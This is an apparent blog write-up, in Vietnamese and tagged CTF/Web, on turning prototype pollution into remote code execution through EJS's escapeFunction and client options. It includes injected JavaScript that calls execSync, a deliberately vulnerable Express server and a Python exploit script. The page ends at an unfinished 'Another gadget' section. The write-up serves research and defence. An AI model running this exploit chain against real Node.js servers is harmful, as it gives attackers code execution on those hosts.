               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>Some note on Prototype pollution to RCE - 3HLD</title>

    

    

    
    <meta name="author" content="3HLD" />
    

    
        <meta property="og:title" content="Some note on Prototype pollution to RCE" />
<meta property="og:description" content="DEEP DOWN TO EJS Example usage : ƒê∆°n gi·∫£n nh∆∞ sau thui : const ejs = require(&quot;ejs&quot;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &quot;12113awefeaw&quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta c√πng ƒë·ªçc qua v·ªÅ h√†m render :
exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/pp2rce/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2025-06-23T18:30:32+02:00" />
<meta property="article:modified_time" content="2025-08-07T08:22:04+00:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Some note on Prototype pollution to RCE"/>
<meta name="twitter:description" content="DEEP DOWN TO EJS Example usage : ƒê∆°n gi·∫£n nh∆∞ sau thui : const ejs = require(&quot;ejs&quot;) const template = &#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;; ejs.clearCache(); const data = { name: &quot;12113awefeaw&quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta c√πng ƒë·ªçc qua v·ªÅ h√†m render :
exports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments."/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">3HLD</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#prototype-pollution-to-rce-">Prototype pollution to RCE .</a></li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#poc-">POC :</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#poc--1">POC :</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#constructorprototype-">Constructor.prototype :</a></li>
    <li><a href="#__proto__">__proto__</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">CTF</div>

  
    <div class="badge">Web</div>

  
</div>

<div>
  <p class="date">
    Last edit: Jun 23, 2025
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    
<h1 id="deep-down-to-ejs" class="header-anchor-wrapper">DEEP DOWN TO EJS
  <a href="#deep-down-to-ejs" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>


<h1 id="example-usage-" class="header-anchor-wrapper">Example usage :
  <a href="#example-usage-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>ƒê∆°n gi·∫£n nh∆∞ sau thui :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">    const ejs = require(&quot;ejs&quot;)
    const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
    ejs.clearCache();
    const data = { name: &quot;12113awefeaw&quot; }
    const compiled = ejs.render(template, data, {}); 
    console.log(compiled.toString())
</code></pre>

<h1 id="how-ejs-works" class="header-anchor-wrapper">How ejs works
  <a href="#how-ejs-works" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<p>Ta c√πng ƒë·ªçc qua v·ªÅ h√†m render :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">
      exports.render = function (template, d, o) {
        var data = d || utils.createNullProtoObjWherePossible();
        var opts = o || utils.createNullProtoObjWherePossible();

        // No options object -- if there are optiony names
        // in the data, copy them to options
        if (arguments.length == 2) {
          utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
        }

        return handleCache(opts, template)(data);
      };
</code></pre>
<ul>
<li>H√†m nh·∫≠n v√†o data v√† options .</li>
<li>N·∫øu kh√¥ng c√≥ options th√¨ ki·ªÉu tra data xem c√≥ key n√†o c√≥ th·ªÉ cho v√†o OPTIONS hay kh√¥ng theo danh s√°ch tr√™n :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
</code></pre>
<ul>
<li>Sau ƒë√≥ g·ªçi h√†m handleCache nh·∫≠n v·ªÅ m·ªôt function v√† cho data l√†m ƒë·ªëi s·ªë. V·∫≠y ta s·∫Ω ph·∫£i t√¨m hi·ªÉu h√†m handleCache s·∫Ω tr·∫£ v·ªÅ function g√¨ .</li>
</ul>
<p>handleCache :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">
      function handleCache(options, template) {
        var func;
        var filename = options.filename;
        var hasTemplate = arguments.length &gt; 1;

        if (options.cache) {
          if (!filename) {
            throw new Error('cache option requires a filename');
          }
          func = exports.cache.get(filename);
          if (func) {
            return func;
          }
          if (!hasTemplate) {
            template = fileLoader(filename).toString().replace(_BOM, '');
          }
        }
        else if (!hasTemplate) {
          // istanbul ignore if: should not happen at all
          if (!filename) {
            throw new Error('Internal EJS error: no file name or template '
              + 'provided');
          }
          template = fileLoader(filename).toString().replace(_BOM, '');
        }
        func = exports.compile(template, options);
        if (options.cache) {
          exports.cache.set(filename, func);
        }
        return func;
      }
</code></pre>
<ul>
<li>Tr∆∞·ªõc h·∫øt n√≥ s·∫Ω ki·ªÉm tra options cache xem c√≥ hay kh√¥ng sau ƒë√≥ s·∫Ω d√πng filename ƒë√≥ ƒë∆∞a v√†o h√†m cache.get(filename) ƒë·ªÉ nh·∫≠n v·ªÅ m·ªôt function th·ª© m√† ta c√≥ th·ªÉ ƒë∆∞a data v√†o ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c template cu·ªëi c√πng.</li>
<li>Tr∆∞·ªùng h·ª£p kh√¥ng c√≥ cache th√¨ s·∫Ω d√πng h√†m <strong>compile</strong> v·ªõi template v√† options ƒë∆∞·ª£c truy·ªÅn v√†o.</li>
</ul>
<p>compile function  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">
      exports.compile = function compile(template, opts) {
        var templ;

        // v1 compat
        // 'scope' is 'context'
        // FIXME: Remove this in a future version
        if (opts &amp;&amp; opts.scope) {
          if (!scopeOptionWarned) {
            console.warn('`scope` option is deprecated and will be removed in EJS 3');
            scopeOptionWarned = true;
          }
          if (!opts.context) {
            opts.context = opts.scope;
          }
          delete opts.scope;
        }
        templ = new Template(template, opts);
        return templ.compile();
      };
</code></pre>
<ul>
<li>T·∫°o m·ªôt Object template v√† tr·∫£ v·ªÅ k·∫øt qu·∫£ sau khi g·ªçi h√†m templ.compile()</li>
<li>Class Template kh√° l·ªõn n√™n m√¨nh s·∫Ω t·∫≠p trung v√†o h√†m compile c·ªßa n√≥ . H√†m compile n√†y l√† core function ƒë·ªÉ t·∫°o n√™n m·ªôt function s·∫Ω nh·∫≠n data v√† tr·∫£ v·ªÅ template.</li>
<li>Tr∆∞·ªõc khi ƒë·ªçc c√°c giai ƒëo·∫°n n√≥ t·∫°o ra h√†m th√¨ ta c√≥ th·ªÉ ƒë∆°n gi·∫£n l√† log h√†m ƒë√≥ ra :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(data) {
      var include = function (path, includeData) {
        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      };
      return fn.apply(opts.context,
        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
    }
</code></pre>
<ul>
<li>Copy data c√°c ki·ªÉu xong s·∫Ω d√πng h√†m fn.apply v·∫≠y ta c·∫ßn bi·∫øt fn ·ªü ƒë√¢y l√† h√†m g√¨ . ƒê·ªçc source ta c√≥ th·∫ª th·∫•y ƒëo·∫°n sau  :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">    var returnedFn = opts.client ? fn : function anonymous(data) {
      var include = function (path, includeData) {
        var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data);
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      };
      console.log(fn.toString())
      return fn.apply(opts.context,
        [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]);
    };
</code></pre>
<ul>
<li>V·ªõi options.client =0 th√¨ ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c h√†m tr√™n v√† fn ·ªü ƒë√¢y sau khi log ra th√¨ ta c√≥  :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(locals, escapeFn, include, rethrow
) {
var __line = 1
  , __lines = &quot;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&quot;
  , __filename = undefined;
try {
  var __output = &quot;&quot;;
  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }
  with (locals || {}) {
    ; __append(&quot;&lt;h1&gt;Hello &quot;)
    ; __append(escapeFn( name ))
    ; __append(&quot;&lt;/h1&gt;&quot;)
  }
  return __output;
} catch (e) {
  rethrow(e, __lines, __filename, __line, escapeFn);
}

}
</code></pre>
<ul>
<li>ƒê·∫øn ƒë√¢y ta ho√†n to√†n c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c logic m√† name ƒë∆∞·ª£c ƒë∆∞a v√†o template. Kh√° ph·ª©c t·∫°p ·ªü ƒë√¢y nh∆∞ng ta s·∫Ω ti·∫øp t·ª•c ƒë·ªçc v√†o h√†m n√†y.</li>
<li>ƒê√¢y l√† source generate ƒë∆∞·ª£c ƒë·ªëng function tr√™n b·∫±ng c√°ch gh√©p nhi·ªÅu chu·ªói v·ªõi nhau</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">
    if (!this.source) {
      this.generateSource();
      prepended +=
        '  var __output = &quot;&quot;;\n' +
        '  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n';
      if (opts.outputFunctionName) {
        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
          throw new Error('outputFunctionName is not a valid JS identifier.');
        }
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
      if (opts.localsName &amp;&amp; !_JS_IDENTIFIER.test(opts.localsName)) {
        throw new Error('localsName is not a valid JS identifier.');
      }
      if (opts.destructuredLocals &amp;&amp; opts.destructuredLocals.length) {
        var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
        for (var i = 0; i &lt; opts.destructuredLocals.length; i++) {
          var name = opts.destructuredLocals[i];
          if (!_JS_IDENTIFIER.test(name)) {
            throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.');
          }
          if (i &gt; 0) {
            destructuring += ',\n  ';
          }
          destructuring += name + ' = __locals.' + name;
        }
        prepended += destructuring + ';\n';
      }
      if (opts._with !== false) {
        prepended += '  with (' + opts.localsName + ' || {}) {' + '\n';
        appended += '  }' + '\n';
      }
      appended += '  return __output;' + '\n';
      this.source = prepended + this.source + appended;
    }

    if (opts.compileDebug) {
      src = 'var __line = 1' + '\n'
        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
        + 'try {' + '\n'
        + this.source
        + '} catch (e) {' + '\n'
        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
        + '}' + '\n';
    }
    else {
      src = this.source;
    }

    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }

    if (opts.strict) {
      src = '&quot;use strict&quot;;\n' + src;
    }
    if (opts.debug) {
      console.log(src);
    }
    if (opts.compileDebug &amp;&amp; opts.filename) {
      src = src + '\n'
        + '//# sourceURL=' + sanitizedFilename + '\n';
    }
</code></pre>
<ul>
<li>ƒê·∫øn ƒë√¢y ta ƒë√£ bi·∫øt r·∫±ng h√†m sau s·∫Ω ƒë∆∞·ª£c execute v√† h√†m ƒë∆∞·ª£c t·∫°o b·ªüi c√°c string gh√©p l·∫°i ? V·∫≠y s·∫Ω th·∫ø n√†o n·∫øu ta c√≥ th·∫ª input t√πy √Ω v√†o h√†m n√†y qua options c·ªßa ejs? T·ª´ ƒë√≥ l·∫•y RCE ? Ta s·∫Ω ƒëi t√¨m m·ªôt v√†i ƒëi·ªÉm n√†o ƒë√≥ c√≥ th·ªÉ cho ta input v√†o . Nh√¨n s∆° ta c√≥ th·ªÉ th·∫•y</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">      if (opts.outputFunctionName) {
        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
          throw new Error('outputFunctionName is not a valid JS identifier.');
        }
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
</code></pre>
<p>Nh∆∞ng v√¨ c√≥ regrex kh√° cƒÉng n√™n c≈©ng kh√¥ng kh·∫£ thi l·∫Øm. Ri√™ng ch·ªâ c√≥ ƒëo·∫°n n√†y :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }
</code></pre>
<p>Well c·∫£ 2 bi·∫øn client v√† escapeFn ƒë·ªÅu ƒë∆∞·ª£c l·∫•y t·ª´ options object v√†o ? S·∫Ω ra sao n·∫øu ta split javascript code v·ªõi &ldquo;;&rdquo; v√† ch√®n rce code v√†o ?</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
const data = { name: &quot;12113awefeaw&quot; }
const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works 
console.log(compiled.toString())
</code></pre>
<p>Khi n√†y function sau s·∫Ω ƒë∆∞·ª£c generate ra :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">function anonymous(locals, escapeFn, include, rethrow
) {
rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) {
  var lines = str.split('\n');
  var start = Math.max(lineno - 3, 0);
  var end = Math.min(lines.length, lineno + 3);
  var filename = esc(flnm);
  // Error context
  var context = lines.slice(start, end).map(function (line, i) {
    var curr = i + start + 1;
    return (curr == lineno ? ' &gt;&gt; ' : '    ')
      + curr
      + '| '
      + line;
  }).join('\n');

  // Alter exception message
  err.path = filename;
  err.message = (filename || 'ejs') + ':'
    + lineno + '\n'
    + context + '\n\n'
    + err.message;

  throw err;
};
    /*OUR OPTIONS GOES IN HERE */
escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
var __line = 1
  , __lines = &quot;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&quot;
  , __filename = undefined;
try {
  var __output = &quot;&quot;;
  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }
  with (locals || {}) {
    ; __append(&quot;&lt;h1&gt;Hello &quot;)
    ; __append(escapeFn( name ))
    ; __append(&quot;&lt;/h1&gt;&quot;)
  }
  return __output;
} catch (e) {
  rethrow(e, __lines, __filename, __line, escapeFn);
}

}
</code></pre>
<p>V√† ta ƒë√£ c√≥ th·ªÉ ch·∫°y b·∫•t k√¨ js command n√†o !!!</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());;
</code></pre>
<p><img alt="image" src="https://hackmd.io/_uploads/HyQcobyOxg.png"></p>

<h2 id="prototype-pollution-to-rce-" class="header-anchor-wrapper">Prototype pollution to RCE .
  <a href="#prototype-pollution-to-rce-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<ul>
<li>Nh∆∞ng trong th·ª±c t·∫ø ta s·∫Ω kh√¥ng ki·ªÉm so√°t ƒë∆∞·ª£c options ƒë∆∞·ª£c ch√®n v√†o . V·∫≠y s·∫Ω ra sao n·∫øu ta c√≥ m·ªôt prototype pollution ·ªü ph√≠a server ? Test v·ªõi ƒëo·∫°n code sau  :</li>
</ul>
<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
ejs.clearCache();
escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
Object.prototype.client = true
Object.prototype.escapeFunction = escapeFunction
const data = { name: &quot;12113awefeaw&quot; }
const compiled = ejs.render(template, data); // not works 
console.log(compiled.toString())

</code></pre>
<p>Hmmmm , ta th·∫•y kh√¥ng c√≥ g√¨ x·∫£y ra c·∫£ v√¨ n·∫øu ƒë·ªÉ √Ω t·ª´ ƒë·∫ßu ƒëo·∫°n code ƒë√£ c√≥ m·ªôt ph·∫ßn check r·∫•t r√µ  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">      exports.render = function (template, d, o) {
        var data = d || utils.createNullProtoObjWherePossible();
        var opts = o || utils.createNullProtoObjWherePossible();
      }
</code></pre>
<p>ƒêi·ªÅu n√†y ƒë√£ block vi·ªác protoytpe pollution nh∆∞ng c√≥ m·ªôt v·∫•n ƒë·ªÅ l√† nhi·ªÅu project ·ªü ngo√†i kia s·∫Ω kh√¥ng bao gi·ªù ƒë·ªÉ tr·ªëng options field v√† ƒë∆°n gi·∫£n s·∫Ω truy·ªÅn v√†o ƒë√≥ m·ªôt <strong>empty object</strong> ~ ~!! ch√≠nh ƒëi·ªÅu n√†y l√† root cause cho vi·ªác bypass n√†y , ƒë·ªÉ simluate ta ƒë∆°n gi·∫£n ch·ªâ c·∫ßn truy·ªÅn {} v√†o l√† ƒëc .</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const ejs = require(&quot;ejs&quot;)
const template = '&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;';
ejs.clearCache();
escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
Object.prototype.client = true
Object.prototype.escapeFunction = escapeFunction
const data = { name: &quot;12113awefeaw&quot; }
const compiled = ejs.render(template, data, {}); // works now with polluted {}
console.log(compiled.toString())
</code></pre>
<ul>
<li>T√®n ten , ƒëi·ªÅu n√†y ho·∫°t ƒë·ªông v√¨ h√†m render s·∫Ω ∆∞u ti√™n nh·∫≠n object t·ª´ ngo√†i v√†o.
<img alt="image" src="https://hackmd.io/_uploads/ByAHKC-Ole.png"></li>
</ul>

<h1 id="express-js" class="header-anchor-wrapper">Express js
  <a href="#express-js" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
<li>ƒê·ªÉ ki·ªÉm ch·ª©ng vi·ªác truy·ªÅn object tr·ªëng v√†o options ta c√≥ th·ªÉ xem s∆° qua source c·ªßa express js ta s·∫Ω th·∫•y ƒëo·∫°n sau  :
<img alt="image" src="https://hackmd.io/_uploads/BkWcAZyueg.png">
V√¨ lu√¥n c√≥ options object n√™n Express default c≈©ng c√≥ th·ªÉ b·ªã l·ªói n√†y .</li>
</ul>

<h3 id="poc-" class="header-anchor-wrapper">POC :
  <a href="#poc-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h3>

<p>Server.js :</p>
<pre  class="mc-prism hide language-text" ><code class="language-js">const express = require('express');
const path = require('path');

const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());


// Set EJS as the template engine
app.set('view engine', 'ejs');

// Set the views directory
app.set('views', path.join(__dirname, 'views'));

app.post(&quot;/pollute_me&quot;, (req, res) =&gt; {
    // Prototype pollution vulnerability here
    Object.assign(Object.prototype, req.body);
    console.log({}.client)
    res.send('Updated!');
})
// Define a simple route
app.get('/', (req, res) =&gt; {
    res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () =&gt; {
    console.log(`Server running on http://localhost:${PORT}`);
});

</code></pre>
<p>ex.py  :</p>
<pre  class="mc-prism hide language-text" ><code class="language-py">import  requests
url = &quot;http://localhost:3000&quot;
escapeFunction = &quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());&quot;
data  = { 
        &quot;client&quot; : '123' ,
        &quot;escapeFunction&quot; : escapeFunction
}
res = requests.post(url+'/pollute_me' ,json=data)
print(res.text)
requests.get(url)

</code></pre>
<p><em>Express views use a default config when calling templating function, which make it vulnerable by default!</em></p>

<h1 id="another-gadget-" class="header-anchor-wrapper">Another gadget :
  <a href="#another-gadget-" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h1>

<ul>
